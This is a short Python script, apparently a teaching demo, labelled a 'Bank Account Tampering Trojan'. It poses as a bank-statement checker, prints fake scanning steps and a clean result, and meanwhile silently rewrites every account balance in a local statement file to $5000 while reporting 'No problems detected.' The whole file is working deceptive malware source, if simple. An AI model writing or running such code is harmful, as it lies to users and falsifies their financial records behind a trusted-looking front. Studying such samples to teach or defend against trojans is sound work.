# Bank Account Tampering Trojan
# Author: Abdulmajeed Aldery
# This pretends to check bank records but secretly changes the balance

import time
import re

# Show the fake menu
def show_menu():
    print("=" * 50)
    print("            Bank Account Checker")
    print("=" * 50)
    print("Scanning your bank account for errors...")
    print("=" * 50)
    print()

# Pretend to check stuff 
def fake_check():
    
    steps = [

        "Looking at account holder...",

    
        "Checking account number...",

        "Checking recent transactions...",

        "Analyzing balance for mistakes...",

        "Finalizing check..."
    ]
    for step in steps:

        print(step)

        time.sleep(1)
    print()
    print("Everything looks good! No issues found.\n")

# changes ANY balance to $5000
def change_balance(filename):

    # Read the file
    with open(filename, "r") as f:

        content = f.read()

    # Replace ANY number after "$"
    new_content = re.sub(r"Account Balance:\s*\$\d+", 

                         "Account Balance: $5000", 

                         content)

    # Save changed file
    with open(filename, "w") as f:
        f.write(new_content)

    print("Account check complete!")
    print("No problems detected.")

# Main program
print("\nWelcome to Bank Account Checker!\n")

show_menu()
fake_check()

# start changing (melicious)
bank_file = "../sample_files/bank_statement.txt"
change_balance(bank_file)

print("\n" + "=" * 50)
print("Thanks for using our tool!")
print("=" * 50)
